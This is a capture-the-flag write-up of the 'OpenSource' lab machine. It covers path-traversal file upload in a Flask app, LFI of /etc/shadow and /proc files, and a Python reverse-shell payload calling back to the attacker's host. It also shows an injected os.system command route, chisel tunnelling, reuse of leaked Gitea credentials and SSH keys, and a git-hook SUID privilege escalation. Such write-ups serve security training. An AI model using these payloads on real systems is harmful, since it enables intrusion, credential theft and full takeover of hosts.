# OpenSource
```
Difficulty: Easy
Operating System: Linux
Hints: True 
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `root` (in Docker) | LFI to RCE via Debug Mode and File Overwrite | Identified a Flask application running in debug mode, which allows for dynamic code reloading. The application's `get_file_name` function, intended to prevent path traversal, was vulnerable to bypass using URL-encoded slashes (`%2F`). I exploited this with a Local File Inclusion (LFI) to confirm the application's root directory (`/app`). By uploading a malicious file to overwrite `/app/app/__init__.py` with a Python reverse shell payload, the application reloaded with my malicious code, granting a shell as the `root` user within the Docker container. |
| 2 | `dev01` | Chisel Tunnelling & Git Credentials | Once inside the container, I used `ifconfig` to discover the internal network and the host's IP (`172.17.0.1`). Noticing that port 3000 was filtered on the main host, I used `chisel` to create a reverse tunnel, forwarding `localhost:3000` to my attacking machine. This exposed a Gitea service. Using credentials (`dev01:Soulless_Developer#2022`) found in a `.git` commit from the website's source code, I logged into Gitea and found an SSH key (`id_rsa`) in a `home-backup` repository, which allowed me to log in to the host machine as the user `dev01`. |
| 3 | `root` | Git Hooks & SUID Exploitation | As `dev01`, I discovered a cron job running a `git-sync` script as the `root` user. The script performed a `git commit` in the user's home directory. I exploited this by creating a `pre-commit` hook script in the `.git/hooks` directory. The hook, which is executed before a commit, contained a command to set the SUID bit on `/bin/bash`. When the cron job ran, the `pre-commit` hook was triggered, and the SUID bit was successfully set. I then executed the `bash -p` command to get a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```shell
Nmap scan report for 10.10.11.164
Host is up (0.044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sun, 31 Jul 2022 18:44:32 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sun, 31 Jul 2022 18:44:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
```
As we can see we have only two ports opened: 80 and 22. There is an additional port 3000 in status filtered, hence we can assume that this host has a listening service on localhost:3000.  
Now we can dig into port 80.  
As we open the site we can quickly find an `upcloud` service and, on the main site, we can download the source of this service as well.  
As a good practice we should always adopt, since there is a `.git` folder in the downloaded sources, we can look around the repository and see if we can find any credentials.  
As we can see we can change the branch to `dev` and find the following credentials into a commit:  
```json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```
Unfortunately these credentials does not permit login on any of the discovered services, so we can keep these apart and carry on our enumeration.  
Now, if we inspect the code, we can see two interesting functions:  
```python
@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```
As we can see `upload_file()` is allowing arbitrary file upload since there is no checks on the file extension.  
`send_report()` is allowing path traversal, since there is the following function checking for malicious path values:  
```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
```
But this function can be easily bypassed by changing the format of the `/` character with `%2F`.  
Let's fuzz this and check for LFI using `wfuzz`:  
```shell
[root@kali source (public ✗)]$ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 308,500 'http://10.10.11.164/uploads/FUZZ'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.164/uploads/FUZZ
Total requests: 920

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000021:   200        27 L     29 W       1172 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"
000000022:   200        27 L     27 W       422 Ch      "..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow"

Total time: 12.15351
Processed Requests: 920
Filtered Requests: 918
Requests/sec.: 75.69828
```
As we can see we get an LFI, now we can enumerate `proc` variables to determine the directory where this service is running and other stuff.  
We can enumerate environment:
```http
GET /uploads/..%2F..%2F..%2F%2F..%2F..%2Fproc/self/environ HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
And we can see that the flask application has a `FLASK_DEBUG=1` flag.  
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Sun, 31 Jul 2022 19:15:34 GMT
Content-Disposition: inline; filename=environ
Content-Type: application/octet-stream
Content-Length: 0
Last-Modified: Sun, 31 Jul 2022 19:13:15 GMT
Cache-Control: no-cache
ETag: "1659294795.4441445-0-1059718893"
Date: Sun, 31 Jul 2022 19:15:34 GMT
Connection: close

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=556408955fe5 LANG=C.UTF-8 GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D PYTHON_VERSION=3.10.3 PYTHON_PIP_VERSION=22.0.4 PYTHON_SETUPTOOLS_VERSION=58.1.0 PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.py PYTHON_GET_PIP_SHA256=e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279a PYTHONDONTWRITEBYTECODE=1 MODE=PRODUCTION FLASK_DEBUG=1 HOME=/root SUPERVISOR_ENABLED=1 SUPERVISOR_PROCESS_NAME=flask SUPERVISOR_GROUP_NAME=flask WERKZEUG_SERVER_FD=3 WERKZEUG_RUN_MAIN=true
```
We can do the same with cmdline:  
```http
GET /uploads/..%2F..%2F..%2F%2F..%2F..%2Fproc/self/cmdline HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
and get the following:  
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Tue, 02 Aug 2022 08:45:38 GMT
Content-Disposition: inline; filename=cmdline
Content-Type: application/octet-stream
Content-Length: 0
Last-Modified: Tue, 02 Aug 2022 08:45:38 GMT
Cache-Control: no-cache
ETag: "1659429938.795898-0-1050805960"
Date: Tue, 02 Aug 2022 08:45:38 GMT
Connection: close

/usr/local/bin/python /app/run.py 
```
Now we can assume that the app is running under `/app/`.
Now that we have more information on the application, since this is a flask application, we need to check what kind of file we can upload to achieve an RCE.  
Poking around on google we can come across [this source](https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution) that explains how to get an RCE with arbitrary file upload by overwriting the `__init__.py` file.  

## Foothold
### Method 1 - Arbitrary File Upload, `__init__.py` Overwrite
Once we have a foothold path, we can create a python reverse shell payload and forge the `filename` field in order to leverage a path traversal file upload and get an RCE:  
```http
POST /upcloud HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------287371904330582195774088103722
Content-Length: 447
Origin: http://10.10.11.164
Connection: close
Referer: http://10.10.11.164/upcloud
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------287371904330582195774088103722
Content-Disposition: form-data; name="file"; filename="..//..//..//..//app/app/__init__.py"
Content-Type: text/x-python

import socket,os,pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.9",4242));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")

-----------------------------287371904330582195774088103722--
```
Now, flask detects a change on a .py file and since it is configured with `FLASK_DEBUG=1`, the web server automatically reloads and apply the changes.  
As we hit the site again we will have a reverse shell:  
```http
POST /upcloud HTTP/1.1
Host: 10.10.11.164
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------26293638831672363921248373520
Content-Length: 253
Origin: http://10.10.11.164
Connection: close
Referer: http://10.10.11.164/upcloud
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------26293638831672363921248373520
Content-Disposition: form-data; name="file"; filename="..//..//..//..//app/app/__init__.py"
Content-Type: image/png


-----------------------------26293638831672363921248373520--
```
and we got shell as root into a container:
```shell
root@kali:~/Documents/HTB/Boxes/OpenSource/walkthroughs# nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.164] 38016
/app #       
```

### Method 2 - Arbitrary File Upload, Malicious Route Creation
When we overwrite the `__init__.py` file, the application stops working since our shell is interrupting the load of libraries.  
Instead of overwriting, we can overwrite `/app/app/views.py` and add an additional route `/exec` that can allow us to execute code:  
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')



@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))


@app.route('/exec')
def cmd():
    return os.system(request.args.get('cmd'))
```

## User
Once we get a foothold into the container we can run `deepce.sh` to check if there is any misconfiguration in the running container that can allow us to evade the container. Unfortunately we cannot find anything.  
If we remember, during our initial nmap scan we found a filtered port 3000 that we assumed was listening on localhost.  
Now we can try to use this container as a proxy to reach that port and see if we can exploit the service.  
If we look at the interfaces:  
```shell
/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:03  
          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2814 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2460 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:981877 (958.8 KiB)  TX bytes:1483557 (1.4 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```
We can see that the container has the IP `172.17.0.3`,  hence we can assume that the router `172.17.0.1` is the actual machine where this container is running.  
Now, as we did for [Antique](Antique.md) we can set up chisel to forward the port 3000 to our host making the container acting as a proxy between our host and localhost.  
On our machine, we can run the following command:  
```shell
[root@kali chisel (master)]$ ./chisel server -p 8000 --reverse
2022/08/01 14:35:28 server: Reverse tunnelling enabled
2022/08/01 14:35:28 server: Fingerprint ciI1E12tHUnUz/5sH6VMTLWagtwn+M2mzYVgN3ZA7FU=
2022/08/01 14:35:28 server: Listening on http://0.0.0.0:8000
2022/08/01 14:37:39 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/08/01 14:37:39 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```
While, on the remote host, we can run:  
```shell
/home # ./chisel client 10.10.14.9:8000  R:3000:172.17.0.1:3000
2022/08/01 12:37:38 client: Connecting to ws://10.10.14.9:8000
2022/08/01 12:37:39 client: Connected (Latency 33.338247ms)
```
Now, if we navigate to `localhost:3000`, we can see the following:  
![](Attachments/Pasted%20image%2020220802173555.png)
If we remember from our initial enumeration we found some credentials: `dev01:Soulless_Developer` if we test these credentials against this service, we login as user `dev01`.  
After we login, we can see a repo called `home-backup`:
![](Attachments/Pasted%20image%2020220802173804.png)
This repo contains an ssh key `id_rsa`.  
If we use this key against ssh service as user `dev01` we can login into the box:  
```shell
[root@kali OpenSource ]$ ssh -l dev01 -i keys/id_rsa $TARGET
The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
ED25519 key fingerprint is SHA256:LbyqaUq6KgLagQJpfh7gPPdQG/iA2K4KjYGj0k9BMXk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.164' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug  1 13:07:21 UTC 2022

  System load:  0.0               Processes:              656
  Usage of /:   75.9% of 3.48GB   Users logged in:        0
  Memory usage: 31%               IP address for eth0:    10.10.11.164
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
dev01@opensource:~$ 
```

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that there are some cronjobs installed. Apart from this we cannot see anything else.  
Now since there are some cronjobs, let's run `pspy64` and see if we can snoop some interesting process.  
```shell
2022/08/01 13:31:01 CMD: UID=0    PID=17758  | /bin/bash /usr/local/bin/git-sync 
2022/08/01 13:31:01 CMD: UID=0    PID=17757  | /bin/sh -c /usr/local/bin/git-sync 
2022/08/01 13:31:01 CMD: UID=0    PID=17756  | /usr/sbin/CRON -f 
2022/08/01 13:31:01 CMD: UID=0    PID=17762  | git commit -m Backup for 2022-08-01 
2022/08/01 13:31:01 CMD: UID=0    PID=17763  | /bin/bash /usr/local/bin/git-sync 
```
As we can see, every minute, this machin is doing a `git commit -m Backup for 2022-08-01` .  
Now, as we can see from [this source](https://githooks.com/)git can be configured to run some commands before or after events such as: commit, push, and receive.  
Every Git repository has a `.git/hooks` folder with a script for each hook you can bind to. And since the repo (home directory) is owned by us, we are free to change or update these scripts as necessary, and Git will execute them when those events occur.
now, we can create a `pre-commit` script containing the following:  
```shell
dev01@opensource:~/.git/hooks$ cat pre-commit
#!/bin/bash
chmod 4755 /bin/bash
```
And wait for the cron to run.  
After a minute we can check bash permissions:  
```shell
dev01@opensource:~/.git/hooks$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
```
And as we can see, now bash has the SUID set.  
Now we can escalate to root by running:  
```shell
dev01@opensource:~/.git/hooks$ bash -p
bash-4.4# id
uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)
```
